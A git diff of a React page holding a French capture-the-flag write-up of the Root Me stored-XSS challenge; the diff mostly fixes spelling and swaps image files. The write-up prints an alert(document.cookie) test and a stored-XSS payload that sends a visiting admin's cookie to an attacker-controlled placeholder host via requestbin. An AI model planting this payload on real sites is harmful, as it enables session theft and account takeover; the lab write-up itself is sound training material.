@@ -5,17 +5,17 @@ import Lexical from "../../../Lexical";
 import LayoutArticleBlog from "../../../LayoutArticleBlog";
 import HeaderChallenge from "../../../HeaderChallenge";
 import { Link } from "react-router-dom";
-import photo1 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/1.png";
-import photo2 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/2.png";
-import photo3 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/3.png";
+import photo1 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/1.webp";
+import photo2 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/2.webp";
+import photo3 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/3.webp";
 // import photo4 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/4.png";
-import photo5 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/5.png";
-import photo6 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/6.png";
-import photo7 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/7.png";
-import photo8 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/8.png";
-import photo10 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/9.png";
-
-import photo9 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/Capture d’écran du 2024-05-06 17-35-23.png";
+import photo5 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/5.webp";
+import photo6 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/6.webp";
+import photo7 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/7.webp";
+import photo8 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/8.webp";
+import photo10 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/9.webp";
+import photo9 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/10.webp";
+import photo11 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/11.webp";
 
 import ParticlesContainer2 from "../../../background Effect/Particles2";
 
@@ -44,39 +44,38 @@ const XssStocké1 = () => {
             <br />
             Nous tombons sur un formulaire de forum pour poster du texte.
             <br />
-            On test le plus simple, si les balise {"<script>"} sont filtré dans
-            les inputs.
+            On teste le plus simple, si les balises {"<script>"} sont filtrées
+            dans les inputs.
             <img
               src={photo1}
               style={{ maxWidth: "450px" }}
-              alt="Capture d'écran du challenge JavaScript webpack Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />
-            Ok ca passe!
+            Ok ça passe!
             <img
               src={photo2}
               style={{ maxWidth: "450px" }}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />
-            Dans la console dévellopement nous constatons également dans
-            l'onglet cookies qu'il ne sont pas transmis en "HTTonly" et donc ils
-            peuvent y être accédé via Javascript.
+            Dans la console de développement, nous constatons également dans
+            l'onglet cookies qu'ils ne sont pas transmis en "HTTPOnly" et donc
+            ils peuvent y être accédés via Javascript.
             <img
               src={photo3}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />
             <br />2 exemples:
             <ul>
               <li>
                 I- Pour récupérer son propre cookie dans une pop-up: <br />
-                <strong> {"<script>alert('document.cookie')</script>"} </strong>
+                <strong> {"<script>alert(document.cookie)</script>"} </strong>
               </li>
               <li>
-                II- Pour récupérer par celui qui va ouvrir le message (admin) ,
-                récupérer(voler) son cookie et l'envoyer sur un serveur en
+                II- Pour récupérer par celui qui va ouvrir le message (admin),
+                récupérer (voler) son cookie et l'envoyer sur un serveur en
                 écoute par l'attaquant:
                 <br />
                 <strong>
-                  {" "}
                   {
                     '<script>document.write("<img src=http://votre-adresse-ip-ou-domaine:port/?tk="+document.cookie+" />");</script>'
                   }
@@ -84,44 +83,46 @@ const XssStocké1 = () => {
               </li>
             </ul>
             {/* <img
-              src={photo4}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
-            /> */}
+          src={photo4}
+          alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
+        /> */}
             <img
               src={photo5}
-              style={{ maxWidth: "450px" }}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />{" "}
-            Dans cette exemple , on utislise un outils en ligne
-            www.requestbin.com, outils qui permet de déboguer(lire) les requtes
-            HTTP. d'autres solution en ligne possible.
+            Dans cet exemple, on utilise un outil en ligne www.requestbin.com,
+            un outil qui permet de déboguer (lire) les requêtes HTTP. D'autres
+            solutions en ligne sont possibles.
             <img
               src={photo6}
-              style={{ maxWidth: "450px" }}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />{" "}
             <img
               src={photo7}
               style={{ maxWidth: "450px" }}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />{" "}
-            On récupere le endpoints sur lequel le service en ligne écoute et on
-            compléte notre script pour le XSS.
+            On récupère le endpoint sur lequel le service en ligne écoute et on
+            complète notre script pour le XSS.
             <img
               src={photo8}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />
-            Aprés le passage du Bot qui nous confirme avoir lu le message sur le
-            forum , on récupere son cookie en lecture sur notre serveur.
+            Après le passage du Bot qui nous confirme avoir lu le message sur le
+            forum, on récupère son cookie en lecture sur notre serveur.
+            <img
+              src={photo9}
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
+            />{" "}
             <img
               src={photo10}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />{" "}
             Bingo, nous avons notre Flag !
             <img
-              src={photo9}
+              src={photo11}
               style={{ maxWidth: "450px" }}
-              alt="Capture d'écran du challenge JavaScript webpck Root ME"
+              alt="Capture d'écran du challenge JavaScript XSS stocké Root ME"
             />{" "}
           </div>
         </LayoutArticleBlog>
